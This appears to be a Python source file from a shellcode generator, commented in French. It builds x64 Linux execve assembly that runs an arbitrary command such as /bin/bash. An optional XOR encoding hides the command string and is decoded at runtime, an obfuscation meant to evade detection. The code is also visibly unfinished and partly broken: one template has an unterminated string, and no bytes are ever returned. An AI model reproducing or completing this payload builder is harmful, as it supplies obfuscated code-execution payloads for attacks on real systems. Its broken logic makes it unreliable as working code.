from keystone import *
import struct
from .utils import sanitize_command
from .parseUserInput import *
def encode_string(s: str, xor_key: int = 0xB6) -> tuple[list[int], int]:
    """
    Encode une chaîne en valeurs numériques XORées.
    Retourne les valeurs encodées et la longueur.
    """
    # Padding à 8 bytes
    padded = s.encode() + b'\x00' * (8 - (len(s) % 8))
    length = len(s)
    
    # XOR chaque byte
    encoded = [b ^ xor_key for b in padded]
    
    # Convertir en valeurs 64-bits
    values = []
    for i in range(0, len(encoded), 8):
        chunk = encoded[i:i+8]
        value = int.from_bytes(bytes(chunk), 'little')
        values.append(value)
    
    return values, length

def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key: int = 0x00) -> bytes:
    """
    Génère un shellcode à partir d'une commande shell.
    
    Args:
        command: La commande à exécuter
        arch: Architecture cible ('x86' ou 'x64')
        xor_key: Clé XOR pour l'obfuscation
    
    Returns:
        bytes: Le shellcode généré
    """
    if arch == 'x64':
        if xor_key == 0x00:
            listOfArguments = []
            command = parsedCommandList[0]
            
            #Template for x64 with no xor
            '''bits64
                part1:
                    xor rax,rax
                    xor rdi,rdi
                    xor rsi,rsi
                    xor rdx,rdx
                    push rdx
                    mov rdx,rsp ; envp
                    push rax
                    jmp shellcodeString

                part2:
                    pop rdi
                    push rax
                    push rdi
                    mov rsi,rsp
                    mov al,59
                    syscall

                shellcodeString:
                    call part2
                    db "/bin/bash"'''


            # Template starting
            asm = f"""
                bits 64
                
                initshellcode:
                    xor rax, rax
                    push rax            ; NULL terminator envp
                    mov rdx, rsp        ; rdx = envp
                    shellcodeString:
                    call part2
                    db "/bin/bash
                    push rax            ; NULL terminator argv
                    jmp shellcodeString
            """


            ''' add this to the asm
            with all strings to push on the stack
            
                shellcodeString:
                    call part2
                    db "/bin/bash
            '''
            #Get the list of strings to push on the stack
            # push it order last to first
            shellcodeString = '''shellcodeString:
                    call part2
                    '''
            for i in range(len(parsedCommandList) - 1, -1, -1):
                shellcodeString += f'db "{parsedCommandList[i]}"\n'

            print("[+] ShellcodeString:")
            print(shellcodeString)
            
            #add the execution flaw in the asm code
            asm += f"""part2:
            pop rdi
            push rax
            push rdi
            mov rsi,rsp
            mov al,59
            syscall"""
            asm += shellcodeString

            
        
            print("ASM:")
            print(asm)

        else:
            # Encode la commande avec la clé XOR
            command = parsedCommandList[0]  # Pour l'instant, on prend que la première commande
            encoded_values, length = encode_string(command, xor_key)
            # Calculer la taille totale en octets (arrondie à 8 bytes)
            coef = length // 8
            reste = length % 8
            if reste != 0:
                coef += 1
            print(f"[+] Coef: {coef}")
            # Début du shellcode
            asm = """
            bits 64
            
            initshellcode:
                xor rax, rax
                push rax            ; NULL terminator envp
                mov rdx, rsp        ; rdx = envp
                push rax            ; NULL terminator argv
            """
            
            # Ajoute les valeurs encodées
            for value in reversed(encoded_values):
                asm += f"""
                mov rdi, {hex(value)}   ; Partie encodée de la commande
                push rdi
                """
            
            asm += """
                mov rdi, rsp        ; rdi = ptr vers la commande encodée
                xor rax, rax        ; compteur pour le décodage
                jmp xorshellcode
                
            shellcodeExecution:
                xor rax, rax
                push rax            ; NULL
                push rdi            ; ptr vers la commande
                mov rsi, rsp        ; rsi = argv [commande, NULL]
                mov al, 59          ; execve
                syscall
                
            xorshellcode:
                xor byte [rdi+rax], """
            
            asm += hex(xor_key)     # Ajoute la clé XOR
            
            asm += """
                inc rax
                cmp rax, """
            
            asm += str(coef*8)      # Ajoute la longueur de la commande
            
            asm += """
                jl xorshellcode
                jmp shellcodeExecution
            """
            
            print("ASM:")
            print(asm)

    elif arch == 'x86':
        raise NotImplementedError("x86 is not supported for the moment")
